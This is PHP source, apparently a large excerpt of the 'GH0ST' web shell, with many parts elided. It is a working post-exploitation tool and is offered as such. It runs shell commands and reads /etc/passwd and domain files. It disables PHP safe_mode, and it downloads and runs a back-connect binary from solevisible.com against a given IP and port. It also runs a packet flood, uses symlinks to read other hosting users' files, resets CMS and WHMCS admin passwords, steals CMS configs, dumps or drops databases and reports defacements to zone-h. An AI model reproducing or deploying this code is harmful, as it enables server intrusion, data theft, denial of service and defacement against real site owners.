			GH0STEx("rm -f '".addslashes($_POST['GH0ST1'])."'");
			$deleted = true;
		}
	}
}
if($deleted)echo 'File Deleted...<script>var elem = $("'.$_POST['GH0ST4'].'").parentNode;elem.parentNode.removeChild(elem);delete editor_files["'.$_POST['GH0ST4'].'"];</script>';else echo 'Error...';}
break;
case 'chmod':
@chdir($_POST['c']);
if(!empty($_POST['GH0ST3'])){
$perms = 0;
for($i=strlen($_POST['GH0ST3'])-1;$i>=0;--$i)
$perms += (int)$_POST['GH0ST3'][$i]*pow(8, (strlen($_POST['GH0ST3'])-$i-1));
if(!@chmod($_POST['GH0ST1'], $perms)){
if($chdir_fals&&$GH0ST_canruncmd){
GH0STEx("cd '".addslashes($_POST["c"])."';chmod ".addslashes($_POST['GH0ST3'])." '".addslashes($GH0ST1_decoded)."'");
echo('Success!');
}else{
echo '<font color="#FFFFFF"><b>Can\'t set permissions!</b></font><br><script>document.mf.GH0ST3.value="";</script>';}
}else{echo('Success!');}
}
clearstatcache();
GH0STNum(8,9,10,7,6,5,4,2,1);
if($chdir_fals){
	$file_perm = $file_info[5];
}else{
	$file_perm = substr(sprintf('%o', @fileperms($_POST['GH0ST1'])),-4);
}
echo '<script>GH0ST3_="";</script><form onsubmit="editor(\''.addslashes($_POST['GH0ST1']).'\',\''.$_POST['GH0ST2'].'\',this.chmod.value,\''.$_POST['c'].'\',\''.$_POST['GH0ST4'].'\',\''.$ftype.'\');return false;"><input type="text" name="chmod" value="'.$file_perm.'"><input type=submit value=" "></form>';
break;
case 'hexdump':
@chdir($_POST['c']);
$c = __read_file($_POST['GH0ST1']);
$n = 0;
$h = array('00000000<br>','','');
$len = strlen($c);
for ($i=0; $i<$len; ++$i) {
...
case 'rename':
@chdir($_POST['c']);
$GH0ST1_escape = addslashes($_POST["GH0ST1"]);
$GH0ST3_escape = addslashes($_POST["GH0ST3"]);
if(!empty($_POST['GH0ST3'])){
$cmd_rename = false;
if($chdir_fals&&$GH0ST_canruncmd){
if(_GH0ST_is_writable($_POST['GH0ST1'])){
$GH0ST1_escape = addslashes($GH0ST1_decoded);
GH0STEx("cd '".addslashes($_POST['c'])."';mv '".$GH0ST1_escape."' '".addslashes($_POST['GH0ST3'])."'");
}else{
$cmd_rename = true;
}
}else{
...
if(!@rename($_POST['GH0ST1'], $_POST['GH0ST3'])&&$cmd_rename){
echo 'Can\'t rename!<br>';}else{echo('Renamed!<script>try{$("'.$_POST['GH0ST4'].'").innerHTML = "<div class=\'editor-icon\'>"+loadType(\''.$GH0ST3_escape.'\',\''.$ftype.'\',\''.$_POST['GH0ST4'].'\')+"</div><div class=\'editor-file-name\'>'.$GH0ST3_escape.'</div>";editor_files["'.$_POST['GH0ST4'].'"].file = "'.$GH0ST3_escape.'";updateFileEditor("'.$GH0ST1_escape.'", "'.$GH0ST3_escape.'");'.($ftype == "dir"?"updateDirsEditor('".$_POST['GH0ST4']."','".$GH0ST1_escape."');":"").'}catch(e){console.log(e)}</script>');$GH0ST1_escape = $GH0ST3_escape;}
}
echo '<form onsubmit="editor(\''.$GH0ST1_escape.'\',\''.$_POST['GH0ST2'].'\',this.name.value,\''.$_POST['c'].'\',\''.$_POST['GH0ST4'].'\',\''.$ftype.'\');return false;"><input type="text" name="name" value="'.addslashes(htmlspecialchars(isset($_POST['GH0ST3'])&&$_POST['GH0ST3']!=''?$_POST['GH0ST3']:$GH0ST1_decoded)).'"><input type=submit value=" "></form>';
break;
case 'touch':
@chdir($_POST['c']);
if( !empty($_POST['GH0ST3']) ) {
$time = strtotime($_POST['GH0ST3']);
if($time){
$touched = false;
if($chdir_fals&&$GH0ST_canruncmd){
	GH0STEx("cd '".addslashes($_POST["c"])."';touch -d '".htmlspecialchars(addslashes($_POST['GH0ST3']))."' '".addslashes($GH0ST1_decoded)."'");
	$touched = true;
}
if(!@touch($_POST['GH0ST1'],$time,$time)&&!$touched)
echo 'Fail!';
else
echo 'Touched!';
...
clearstatcache();
echo '<script>GH0ST3_="";</script><form onsubmit="editor(\''.addslashes($_POST['GH0ST1']).'\',\''.$_POST['GH0ST2'].'\',this.touch.value,\''.$_POST['c'].'\',\''.$_POST['GH0ST4'].'\',\''.$ftype.'\');return false;"><input type=text name=touch value="'.date("Y-m-d H:i:s", ($chdir_fals?$file_info[4]:@filemtime($_POST['GH0ST1']))).'"><input type=submit value=" "></form>';
break;
case 'image':
@chdir($_POST['c']);
echo('<hr>');
...
if($chdir_fals&&$GH0ST_canruncmd){
	$source = GH0STEx("cat '".addslashes($file)."' | base64");
	list($width, $height) = explode(":", GH0STEx("identify -format '%w:%h' '".addslashes($file)."'"));
	$mime = explode(":", GH0STEx("file --mime-type '".addslashes($file)."'"));
...
if($GLOBALS["glob_chdir_false"]){
	...
	if(_GH0ST_is_writable($scriptpath)){
		GH0STEx("cp '".addslashes($_POST["file"])."' '".addslashes($filepath)."'");
		readfile($filepath);
		@unlink($filepath);
	}else{
		GH0STEx("cat '".addslashes($_POST["file"])."'");
	}
}else{
	readfile($_POST['file']);
}
}else echo('Error...!');}}
function __GH0ST_set_cookie($key, $value){
	$_COOKIE[$key] = $value;
	@setcookie($key, $value, time()+(86400 * 7), '/');
}
function GH0STphpeval(){
if(isset($_COOKIE["eval_tmpdir"])&&@is_dir($_COOKIE["eval_tmpdir"])){
	$tempdir = __ZGVjb2Rlcg($_COOKIE["eval_tmpdir"]);
}else{
	$tempdir = dirname(GH0STEx("mktemp"));
	__GH0ST_set_cookie("eval_tmpdir", __ZW5jb2Rlcg($tempdir));
}
GH0SThead();
if(isset($_POST['GH0ST2']) && ($_POST['GH0ST2'] == 'ini')){
echo '<div class=header>';
ob_start();
$INI=ini_get_all();
...
if(isset($_POST['GH0ST2']) && ($_POST['GH0ST2'] == 'info')) {
...
if(isset($_POST['GH0ST2']) && ($_POST['GH0ST2'] == 'exten')) {
echo '<div class=header>';
ob_start();
...
echo "<option value='".htmlspecialchars($v)."' ".($_POST['GH0ST1']==$v?'selected':'').">".$k."</option>";
echo "</select> <input type='submit' value=' '/><br><textarea  name='input' style='margin-top:5px' class='bigarea'>".(empty($_POST['GH0ST1'])?'':htmlspecialchars(@$_POST['GH0ST2']))."</textarea></form>";
if(!empty($_POST['GH0ST1'])){
$string = addslashes($_POST['GH0ST2']);
...
if(!empty($_POST['GH0ST1']) && !empty($_POST['GH0ST2']) && !empty($_POST['GH0ST3'])){
echo __pre();
$packets=0;
ignore_user_abort(true);
$exec_time=(int)$_POST['GH0ST2'];
$time=time();
$max_time=$exec_time+$time;
$host=$_POST['GH0ST1'];
$port=(int)$_POST['GH0ST3'];
$method=$_POST['GH0ST4'];
...
if(isset($_POST['GH0ST3'])&&($_POST['GH0ST3'] == 'whmcs')){
echo __pre();
...
if(isset($_POST['GH0ST1']) && ($_POST['GH0ST1'] == 'vb')){
echo __pre();
...
if(isset($_POST['GH0ST6'])){
$mybb_dbh = $_POST['GH0ST6'];
$mybb_dbu = $_POST['GH0ST7'];
$mybb_dbn = $_POST['GH0ST8'];
$mybb_dbp = $_POST['GH0ST9'];
$mybb_index = $_POST['GH0ST10'];
...
if(empty($_POST['ajax'])&&!empty($_POST['GH0ST1']))
...
echo GH0STEx($cmd.$_POST['GH0ST1'], true);
echo '</pre>';
}
echo "</div>";
GH0STfooter();
...
if(!empty($_POST['GH0ST8']) && isset($_POST['GH0ST8']) == 'domains'){
if(!_GH0ST_file_exists("/etc/virtual/domainowners")){
echo __pre();
$solevisible9 = _GH0ST_file('/etc/named.conf');
...
echo __pre();
$users = _GH0ST_file("/etc/virtual/domainowners");
if(is_array($users)){
foreach($users as $boz){
$dom = explode(":",$boz);
echo $dom[0]."\n";}}}}
if(!empty($_POST['GH0ST6']) && isset($_POST['GH0ST6']) == 'valiases'){
echo '
...
if(isset($_POST['GH0ST9']) && $_POST['GH0ST9'] == '>>'){
if(!_GH0ST_file_exists("/etc/virtual/domainowners")){
$site = trim($_POST['GH0ST7']);
...
if(function_exists("posix_getpwuid") && function_exists("fileowner")){
	...
	if(_GH0ST_can_runCommand(true,true)){
		$user = GH0STEx("stat -c '%U' /etc/valiases/".$rep);
	}
}
...
if(!empty($_POST['GH0ST5']) && isset($_POST['GH0ST5'])){
if(!_GH0ST_file_exists("/etc/virtual/domainowners")){
echo __pre();
$i = 0;
while ($i < 60000) {
...
$user = explode(":",$boz);
echo trim($user[1]).'<br>';}}}
if(!empty($_POST['GH0ST4']) && isset($_POST['GH0ST4'])){
echo __pre();
if(_GH0ST_can_runCommand(true,true)){echo __read_file("/etc/passwd");}elseif(function_exists("posix_getpwuid")){
...
if(!empty($_POST['GH0ST2']) && isset($_POST['GH0ST2'])){
...
if(!empty($_POST['GH0ST1'])&& isset($_POST['GH0ST1'])){
@__write_file($GLOBALS['cwd']."php.ini","safe_mode=OFF\ndisable_functions=ByPassed By Sole Sad & Invisible(DARK CLOUD LOGS)");
echo '<center><b><big> php.ini created...!</center></b></big>';
}
if(!empty($_POST['GH0ST3']) && isset($_POST['GH0ST3'])){
...
if(isset($_POST['GH0ST1'])&&!empty($_POST['GH0ST1'])){
$lang = $_POST['GH0ST1'];
$ip = $_POST['GH0ST2'];
$port = $_POST['GH0ST3'];
$arg = ($_POST['GH0ST4']=='bind'?$port:$port.' '.$ip);
$tmpdir = GH0ST_TEMPDIR;
...
if($lang=='bcwin'){
$GH0ST = new GH0STCURL();
$s = $GH0ST->Send('http://solevisible.com/bc/windows.exe');
$tmpdir = GH0ST_TEMPDIR;
$f = @fopen($tmpdir.'/bcwin.exe','w+');
@fwrite($f, $s);
@fclose($f);
$out = GH0STEx($tmpdir."/bcwin.exe ".$_POST['GH0ST2']." ".$_POST['GH0ST3']);
}
if($lang=='php'){
echo "<pre class=ml1 style='margin-top:5px'>";
$code = __get_resource($lan);
...
<input type="text" name="defacer" size="67" id="text" placeholder="DARK CLOUD LOGS 2012" />
<br>
...
$GH0ST->Send("http://www.zone-h.com/notify/single","post","defacer=".$hacker."&domain1=". $sites[$i]."&hackmode=".$method."&reason=".$neden);
++$i;
}
...
GH0ST_Create_A_Tag('pwchanger',$vals);
echo '</h3></center>';
if(isset($_POST['GH0ST1'])&&$_POST['GH0ST1']=='wp'){
...
if ($_POST['GH0ST2'] && $_POST['GH0ST2'] == '>>'){
$localhost = $_POST['GH0ST3'];
$database = $_POST['GH0ST4'];
$username = $_POST['GH0ST5'];
$password = $_POST['GH0ST6'];
$admin = $_POST['GH0ST8'];
$SQL = $_POST['GH0ST9'];
$prefix = $_POST['GH0ST10'];
...
if($_POST['GH0ST2'] && $_POST['GH0ST2'] == 'joomla'){
...
if($_POST['GH0ST4'] && $_POST['GH0ST4'] == 'vb'){
...
echo '<p><input value=" " name="send" type="submit"></p></form></center>';
if($_POST['GH0ST1'] && $_POST['GH0ST1'] == '>>'){
$localhost = $_POST['GH0ST2'];
$database = $_POST['GH0ST3'];
$username = $_POST['GH0ST5'];
$password = $_POST['GH0ST6'];
$prefix = $_POST['GH0ST7'];
$admin = $_POST['GH0ST8'];
...
if(isset($_POST['GH0ST5']) && $_POST['GH0ST5'] == 'phpbb'){
...
if(isset($_POST['GH0ST6']) && $_POST['GH0ST6'] == 'whmcs'){
...
if(isset($_POST['GH0ST7']) && $_POST['GH0ST7'] == 'mybb'){
...
if(isset($_POST['GH0ST8']) && $_POST['GH0ST8'] == 'nuke'){
...
if(isset($_POST['GH0ST9']) && $_POST['GH0ST9'] == 'drupal'){
...
if(isset($_POST['GH0ST10']) && $_POST['GH0ST10'] == 'smf'){
...
function GH0STMakePwd(){
	if(_GH0ST_file_exists("/etc/virtual/domainowners")||(_GH0ST_file_exists("/etc/named.conf")&&_GH0ST_file_exists("/etc/valiases"))){
...
function GH0STGetDomains($state = false){
	$state = "named.conf";
	$lines = array();
	$lines = _GH0ST_file('/etc/named.conf');
	if(!$lines){
...
function GH0STCreateParentFolder(){
	$parent = $GLOBALS['home_cwd'] . "/" . __GH0ST_DATA_FOLDER__;
	if(!@is_dir($parent)){
		@mkdir($parent, 0755, true);
	}
}
function GH0STsymlink(){
GH0SThead();
GH0STNum(9,10);
GH0STCreateParentFolder();
@chdir($GLOBALS['home_cwd'] . "/" . __GH0ST_DATA_FOLDER__);
...
if(isset($_POST['GH0ST2'])&&($_POST['GH0ST2']=='symperl'||$_POST["GH0ST2"]=="sympy")){
	...
	@chmod($cginame,0755);
	echo __pre();
	$resource = GH0STEx("{$lang} {$cginame} {$sympath}",false,true,true);
	if(strlen($resource) == 0){
		echo GH0STiFrameCreator('cgiGH0ST/'.$cginame);
	}else{
		echo $resource;
	}
}
if(isset($_POST['GH0ST4']) && $_POST['GH0ST4']=='SymFile'){
if(function_exists('symlink')||_GH0ST_can_runCommand(true,true)){
GH0STNum(9,10);
echo __pre().'
...
<input type="text" name="symfile" placeholder="Example : GH0ST.txt" size="60"/>
<p><input type="submit" value=" " name="symlink" /></p></form></center>';
$path = $_POST['GH0ST5'];
$symname = $_POST['GH0ST6'];
$solevisible58 = $_POST['GH0ST7'];
if($solevisible58){
$new_name = str_replace(".", "_", basename($symname));
$rand_dir = $new_name.rand(111,9999);
$sym_dir = 'GH0STsymlinkphp/'.$rand_dir.'/';
@mkdir($sym_dir, 0777, true);
GH0STcgihtaccess('sym', $sym_dir, $symname);
_GH0ST_symlink("$path","$sym_dir/$symname");
echo __pre();
echo '<center><b><font color="white">Click >> </font><a target="_blank" href="'.__GH0ST_DATA_FOLDER__."/".$sym_dir.'" ><b><font size="4">'.$symname.'</font></b></a></b></center>';
}
}else{echo "<center><pre class=ml1 style='margin-top:5px'><b><font color=\"#FFFFFF\">[+] Symlink Function Disabled !</b></font></pre></center>";}
}
if(isset($_POST['GH0ST2']) && $_POST['GH0ST2']=='symphp'){
$cant_symlink = true;
if(function_exists('symlink')||_GH0ST_can_runCommand(false,false)){
@mkdir('GH0STsymlink',0777);
GH0STcgihtaccess('sym','GH0STsymlink/');
_GH0ST_symlink('/','GH0STsymlink/root');
...
if(_GH0ST_file_exists("/etc/named.conf") && !_GH0ST_file_exists("/etc/virtual/domainowners") && _GH0ST_file_exists("/etc/valiases/")){
echo "<center>";
$lines = array();
$anony_domains = array();
...
$domains = GH0STGetDomains();
$lines = $domains["lines"];
$state = $domains["state"];
$is_posix = function_exists("posix_getpwuid") && function_exists("fileowner");
$can_runcmd = _GH0ST_can_runCommand(false,false);
...
echo $table_header;
$count=1;
$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="{http}"/><span style="color:#00A220;margin-left:10px;"><b>{domain}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{owner}</font></b></td><td><a href="'.__GH0ST_DATA_FOLDER__.'/GH0STsymlink/root{sympath}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
foreach($lines as $line){
	...
	if($anonymous){
		...
		if(strlen(trim($domain)) > 2 && $state != "passwd"){
			if(!_GH0ST_file_exists('/etc/valiases/'.$domain, false))continue;
			if($is_posix){
				$user = @posix_getpwuid(@fileowner('/etc/valiases/'.$domain));
				$owner = $user["name"];
			}elseif($can_runcmd){
				$owner = GH0STEx("stat -c '%U' /etc/valiases/".$domain,false,false);
			}
		}
	}
	if(!$anonymous){
...
$is_direct = false;
$makepwd = GH0STMakePwd();
if(_GH0ST_file_exists("/etc/virtual/domainowners")){
	$makepwd = "/home/{user}/public_html";
	$is_direct = true;
}
$sole = _GH0ST_file("/etc/virtual/domainowners");
$count=1;
echo $table_header;
$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="http://www.{url}"/><span style="color:#00A220;margin-left:10px;"><b>{url}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{user}</font></b></td><td><a href="'.__GH0ST_DATA_FOLDER__.'/GH0STsymlink/root{cwd}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
if($sole){
	...
	if($passwd){
		...
		if(!$site_domains){
			$site_domains = GH0STEx("ls /etc/virtual/");
			$site_domains = explode("\n", $site_domains);
			if(!$site_domains){
				$site_domains = _GH0ST_file("/etc/named.conf");
...
if(!empty($curr_mysql_id)){
	...
	echo "<script>mysql_cache['".$curr_mysql_id."']['host']='".addslashes($_POST['sql_host'])."';mysql_cache['".$curr_mysql_id."']['user']='".addslashes($_POST['sql_login'])."';mysql_cache['".$curr_mysql_id."']['pass']='".addslashes($_POST['sql_pass'])."';mysql_cache['".$curr_mysql_id."']['db']='".addslashes($_POST['sql_base'])."';mysql_cache['".$curr_mysql_id."']['charset']='".addslashes($_POST['charset'])."';mysql_cache['".$curr_mysql_id."']['type']='".addslashes($_POST['type'])."';mysql_cache['".$curr_mysql_id."']['count']='".addslashes($_POST['sql_count'])."';".$sql_title_db."GH0STConnectionHistoryUpdate();</script>";
}
if(isset($db) && $db->link){
if(!empty($_POST['sql_base'])){
echo "<div class='mysql-main'><div mode='block' onclick='GH0STMysqlTablePanelCtl(this);' class='tables-panel-ctl db-opt-id'>&#x3C;&#x3C;</div><div class='mysql-tables'><div><input placeholder=\"Filter Table\" style='padding: 0;margin-left: 11px;text-align:center;' type='text' name='filter_all'><button class='db-opt-id' onclick='GH0STMysqlFilterAllTable(this);return false;'>Search</button></div><div class='block'><a sql_count='".(empty($_POST['sql_count'])?"false":"true")."' mode='closed' onclick='GH0STMysqlFilterAllTable(this,true);' class='expander parent-expander db-opt-id' href='javascript:void(0);'><img src='http://solevisible.com/icons/menu/b_plus.png' title='Expand/Collapse All DataBases' alt='Expand/Collapse All DataBases'></a></div><ul style='margin-top: 28px;'>";
foreach ($database_list as $db_name) {
	echo '<li><div class="block"><i></i><b></b><a sql_count="'.(empty($_POST['sql_count'])?"false":"true").'" db_target="'.$db_name.'" onclick="GH0STMysqlExpander(this);" class="expander cls-'.$db_name.'-expander db-opt-id" href="javascript:void(0);"><img src="http://solevisible.com/icons/menu/'.($db_name == $_POST['sql_base']?"b_minus.png":"b_plus.png").'" title="Expand/Collapse" alt="Expand/Collapse"></a></div><span class="db_name">'.$db_name.'</span><div class="clearfloat"></div><div db_name="'.$db_name.'" mode="'.($db_name == $_POST['sql_base']?"loaded":"no").'" class="list_container cls-'.$db_name.'"><div>';
	if($db_name == $_POST['sql_base']){
		$db->selectdb($_POST['sql_base']);
		$tbls_res = $db->listTables();
		echo '<ul><li><div class="block"><i></i><b></b></div><div><input style="padding: 0;margin-left: 11px;text-align:center;" type="text" class="db-opt-id" target=".cls-'.$db_name.'" placeholder="Filter Table" onkeyup="GH0STMysqlFilterTable(this);" name="filter"></div></li>';
		while($item = $db->fetch($tbls_res)){
		list($key, $value) = each($item);
		if(!empty($_POST['sql_count']))
		$n = $db->fetch($db->query('SELECT COUNT(*) as n FROM `'.$value.'`'));
		$value = htmlspecialchars($value);
		echo "<li><div class='block'><i></i><b></b></div><div class='tables-row'><input type='checkbox' name='tbl[]' value='".$value."'>&nbsp;<a class='db-opt-id' db_target='".$db_name."' href='javascript:void(0);' onclick=\"GH0STLoadTableData(this,'".$value."')\"><span class='mysql_tables' style='font-weight:unset;'>".$value."</span></a>" . (empty($_POST['sql_count'])?'&nbsp;':" <small><span style='font-weight:unset;' class='mysql_table_count'>({$n['n']})</span></small>") . "</div></li>";
		}
		echo '</ul><div style="margin-left: 26px;margin-bottom: 10px;margin-top: 10px;"><input onchange="GH0STMysqlTablesEvil(this);" class="db-opt-id" target=".cls-'.$db_name.'" type="checkbox" class="db-opt-id"><select onchange="GH0STMysqlTablesDumpDrop(this);" class="db-opt-id" target=".cls-'.$db_name.'" class="db-opt-id" name="tables_evil" style="padding: 0;width: 100px;"><option selected>drop</option><option>dump</option></select> <button onclick="GH0STMysqlTablesDumpDropBtn(this);return false;" class="db-opt-id" db_target="'.$db_name.'" target=".cls-'.$db_name.'" class="db-opt-id">Do it</button><div class="dump-file-holder" style="display:none;margin-left:20px;margin-top: 5px;"><input style="padding: 0;text-align:center;" type="text" placeholder="dump.sql" name="dump_file"></div></div>';
	}
	echo "</div></li>";
}
echo "</ul></div><div class='mysql-query-results'><div class='mysql-query-result-tabs'><div class='db-opt-id mysql-query-selected-tab' target='.mysql-query-result-content' onclick='GH0STMysqlTabCtl(this);'>Result</div><div class='db-opt-id' target='.mysql-query-form' onclick='GH0STMysqlTabCtl(this);'>Query</div><div class='db-opt-id' target='.mysql-search-area' onclick='GH0STMysqlTabCtl(this);'>Search</div><div class='db-opt-id' target='.mysql-structure' onclick='GH0STMysqlTabCtl(this);'>Structure</div><div class='db-opt-id' target='.mysql-insert-row' onclick='GH0STMysqlTabCtl(this);'>Insert</div><div style='display:none;' class='db-opt-id' target='.mysql-edit-row' onclick='GH0STMysqlTabCtl(this);'>Edit</div></div><div class='mysql-query-content mysql-insert-row mysql-hide-content'></div><div class='mysql-query-content mysql-edit-row mysql-hide-content'></div><div class='mysql-query-content mysql-search-area mysql-hide-content'></div><div class='mysql-query-content mysql-structure mysql-hide-content'></div><div class='mysql-query-content mysql-query-form mysql-hide-content'><div style='margin-bottom: 5px;'><span>Query:</span></div><textarea name='query' style='width:90%;height:100px'></textarea><p><div style='float:left;margin-left: 30px;'><input class='button db-opt-id' db_target='".$_POST['sql_base']."' onclick='GH0STMysqlQuery(this);return false;' type='submit' value=' '></div></p></div><div class='mysql-query-content mysql-query-result-content'><div class='mysql-query-result-header'><div style='margin-bottom: 10px;' class='mysql-query-reporter'></div><div class='mysql-query-pager'></div></div><div class='mysql-query-table'></div></div></form></td></tr>";
}
echo "</table></div>";
echo "</div>";
}else{
...
function GH0STSql_manager_api(){
	$db = $_POST["GH0ST1"];
	$type = $_POST["GH0ST2"];
	$sql_count = $_POST["GH0ST3"] == "true" ? true : false;
	...
	if($conn){
		if($type == "load_all_tables"){
			...
			if($db["mode"] == "drop"){
				...
				if(strlen(GH0STEx("mysqldump"))>0){
					GH0STEx("mysqldump --single-transaction --host=\"".$db["host"]."\" --user=\"".$db["user"]."\" --password=\"".$db["pass"]."\" ".$db["db"]." ".implode(" ", $db["tables"])."  > ".$db["dump_file"]);
				}else{
			...
			if($col_key){
				...
				$col_key = $col_key[0];
				if(!empty($col_key)){
					$tbl_content = '<div style="margin-bottom:5px;margin-top:5px;"><button col_key="'.$col_key.'" tbl_name="'.$db["table"].'" db_id="'.$db["db_id"].'" 	db_target="'.$db["db"].'" onclick="GH0STMysqlDeleteAllSelectedrows(this);return false;">Delete Selected Rows</button></div><table width="100%" cellspacing="1" cellpadding="2" class="main mysql-data-tbl" style="background-color:#292929">';
				}
			}else{
				$col_key = false;
			}
			while($item = @mysqli_fetch_assoc($q_tables)){
				if(!$title){
					...
					if($col_key){
						$tbl_content .= '<th style="width: 55px;text-align:center;"><input db_id="'.$db["db_id"].'" onchange="GH0STMysqlTblSelectAll(this);" type="checkbox"></th><th style="width: 55px;text-align:center;">Edit</th><th style="width: 55px;text-align:center;">Delete</th>';
					}
				...
				if($col_key){
					$cacheMsg = '<td style="text-align:center;"><input row_id="'.$line.'" type="checkbox" name="tbl_rows_checkbox[]" value="'.$item[$col_key].'"></td><td style="text-align:center;"><a class="db-opt-id" href="javascript:void(0);" db_id="'.$db["db_id"].'" db_target="'.$db["db"].'" tbl_name="'.$db["table"].'" col_key="'.$col_key.'" key="'.$item[$col_key].'" onclick="GH0STMysqlEditRow(this, \'edit\');" style="color:#0acaa6;">Edit</a></td><td style="text-align:center;"><a class="db-opt-id" href="javascript:void(0);" db_id="'.$db["db_id"].'" db_target="'.$db["db"].'" tbl_name="'.$db["table"].'" col_key="'.$col_key.'" key="'.$item[$col_key].'" row_id="'.$line.'" onclick="GH0STMysqlEditRow(this, \'delete\');" style="color:#ff1e1e;">Delete</a></td>';
				}
...
function GH0STselfrm(){
if(isset($_POST['GH0ST1'])&&$_POST['GH0ST1']=='yes'){
echo(__pre().'<center>');
...
function GH0STcgishell(){
GH0SThead();
$div = "";
GH0STCreateParentFolder();
@chdir($GLOBALS['home_cwd'] . "/" . __GH0ST_DATA_FOLDER__);
if(!in_array($_POST['GH0ST1'],array('perl','py'))){
$div = "</div>";
...
if(isset($_POST['GH0ST1'])&&in_array($_POST['GH0ST1'],array('perl','py'))){
@mkdir('cgiGH0ST',0755);
@chdir('cgiGH0ST');
GH0STcgihtaccess('cgi');
$name = $_POST['GH0ST1'].'.GH0ST';
...
if($_POST['GH0ST1']=='perl'){$code = $perl;}else{$code = $py;}
if(__write_file($name,$code)){
@chmod($name,0755);
echo '<iframe src="'.__GH0ST_DATA_FOLDER__.'/cgiGH0ST/'.$name.'" width="100%" height="600px" frameborder="0" style="opacity:0.9;filter: alpha(opacity=9);overflow:auto;"></iframe>';
}
}
echo $div;
GH0STfooter();
...
if($_POST['GH0ST5']!=''){
$db_host=($_POST['GH0ST7']);
$db_username=($_POST['GH0ST3']);
$db_password=($_POST['GH0ST4']);
$db_name=($_POST['GH0ST5']);
$cc_encryption_hash=($_POST['GH0ST6']);
echo __pre();
...
$start = strip_tags($_POST['GH0ST2']);
$end = strip_tags($_POST['GH0ST3']);
$host = strip_tags($_POST['GH0ST4']);
if(isset($_POST['GH0ST4']) && is_numeric($_POST['GH0ST3']) && is_numeric($_POST['GH0ST2'])){
echo __pre();
...
function GH0STcgihtaccess($m,$d='', $symname=false){
$readme = "";
...
$safe_mode = @ini_get('safe_mode');
if(_GH0ST_can_runCommand(true,false)&&($basedir||$safe_mode)){
...
$tmp_path = GH0STWriteTocgiapi("basedir.GH0ST",$bash);
$bash_users  = GH0STEx("cd ".$tmp_path."/GH0STcgiapi;sh basedir.GH0ST ".$makepwd,false,true,true);
...
if(isset($_POST['GH0ST4'])&&($_POST['GH0ST4'] == '>>')){
$mail_to = $_POST['GH0ST1'];
$mail_from = $_POST['GH0ST2'];
$mail_subject = $_POST['GH0ST3'];
$mail_content = $_POST['GH0ST5'];
$count_mail = (int)$_POST['GH0ST6'];
$mail_attach = $_POST['GH0ST7'];
...
<div class="txtfont">Dir/File: </div> <input type="text" name="dirzip" value="'.(!empty($_POST['GH0ST3'])?htmlspecialchars($_POST['GH0ST3']):htmlspecialchars($GLOBALS['cwd'])).'" size="60"/>
<div class="txtfont">Save Dir: </div> <input type="text" name="zipfile" value="'.$GLOBALS['cwd'].'GH0ST.zip" size="60"/>
<input type="submit" value=" " name="ziper" />
</form></center></p>';
if(isset($_POST['GH0ST5']) && ($_POST['GH0ST5'] == '>>')){
$dirzip = $_POST['GH0ST3'];
$zipfile = $_POST['GH0ST4'];
if($GLOBALS['sys']!='unix'&&_GH0ST_can_runCommand(true,true)){
GH0STEx("powershell Compress-Archive -Path '".addslashes($dirzip)."' -DestinationPath '".addslashes(basename($zipfile))."'");
echo __pre().'<center><p>Done -> <b><font color="green">'.$zipfile.'</font></b></p></center>';
}elseif($GLOBALS['sys']=='unix'&&_GH0ST_can_runCommand(true,true)){
GH0STEx("cd '".addslashes(dirname($zipfile))."';zip -r '".addslashes(basename($zipfile))."' '".addslashes($dirzip)."'");
echo __pre().'<center><p>Done -> <b><font color="green">'.$zipfile.'</font></b></p></center>';
}elseif(class_exists('ZipArchive')){
if(__GH0STziper($dirzip, $zipfile)){
...
function __GH0STziper($source,$destination){
...
<div class="txtfont">File: </div> <input type="text" name="dirzip" value="'.(!empty($_POST['GH0ST3'])?htmlspecialchars($_POST['GH0ST3']):htmlspecialchars($GLOBALS['cwd'])).'" size="60"/>
...
@finfo_close($finfo);
	...
	if($GLOBALS['sys']=='unix'&&_GH0ST_can_runCommand(true,true)){
		$file_type = GH0STEx('file -b --mime-type ' . $dirzip);
	}
}
if($GLOBALS['sys']!='unix'&&_GH0ST_can_runCommand(true,true)){
GH0STEx("powershell expand-archive -path '".addslashes($dirzip)."' -destinationpath '".addslashes(basename($zipfile))."'");
echo __pre().'<center><p>Done -> <b><font color="green">'.$zipfile.'</font></b></p></center>';
}elseif($GLOBALS['sys']=='unix'&&!empty($file_type)&&_GH0ST_can_runCommand(true,true)&&(strlen(GH0STEx('which unzip')) > 0||strlen(GH0STEx('which tar')) > 0||strlen(GH0STEx('which gunzip')) > 0)){
switch ($file_type) {
	case 'application/zip':
		GH0STEx("cd '".addslashes($zipfile)."';unzip '".addslashes($dirzip)."'");
	break;
	case 'application/x-tar': case 'application/x-gzip': case 'application/x-gtar':
		if(strstr(basename($dirzip), ".tar.gz")||strstr(basename($dirzip), ".tar")){
			GH0STEx("cd '".addslashes($zipfile)."';tar xzf '".addslashes($dirzip)."'");
		}else{
			GH0STEx("cd '".addslashes($zipfile)."';gunzip '".addslashes($dirzip)."'");
		}
	break;
}
...
function GH0STcmshijacker(){
GH0SThead();
GH0STNum(5,6,7,8,9,10);
...
SaveTo: <input size="50" type="text" name="saveto" value="'.$GLOBALS['cwd'].'GH0ST.txt"></font>
<input type="submit" name="btn" value=" "></form></center><br>';
$cms = $_POST['GH0ST1'];
$saveto = $_POST['GH0ST2'];
$cmspath = $_POST['GH0ST4'];
if(!empty($cms) AND !empty($saveto) AND $_POST['GH0ST4'] AND $_POST['GH0ST3'] == '>>'){
echo __pre();
GH0STHijackCms($cms,$cmspath,$saveto);
}
echo '</div>';
GH0STfooter();
}
function GH0STHijackCms($cms,$cmspath,$saveto){
switch($cms){
case "vb":
...
